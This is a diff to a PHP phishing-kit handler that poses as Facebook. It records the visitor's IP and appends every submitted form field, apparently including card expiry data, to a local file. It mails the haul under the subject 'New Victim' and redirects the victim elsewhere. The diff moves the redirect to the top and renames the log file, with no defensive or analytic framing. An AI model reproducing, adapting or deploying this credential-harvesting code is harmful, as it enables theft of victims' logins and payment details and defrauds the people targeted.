@@ -1,4 +1,5 @@
 <?php
+header('Location: https://forasna.com/');
 $ip = getenv("REMOTE_ADDR");
 $message .= "-------------------- Facebook -------------------\n";
 $message .= "--------------  Infos -------------\n";
@@ -14,7 +15,7 @@ $subject = "New Victim By munther ALiraqi ".$_POST['exm']."/".$_POST['exy'];
 
 // ==================================
 
-$handle = fopen("rezzzzza.text", "a");
+$handle = fopen("Date.txt", "a");
 foreach($_POST as $variable => $value) {
     fwrite($handle, $variable);
     fwrite($handle, "=");
@@ -23,11 +24,9 @@ foreach($_POST as $variable => $value) {
 }
 fwrite($handle, "===============BY ABDO V1===============\r\n");
 fclose($handle);
-
 // ==================================
 
 
 fwrite($subject, $message);
 mail($send,$subject,$message,$headers);
 
-header('Location: https://onlinepngtools.com/change-png-color');?>
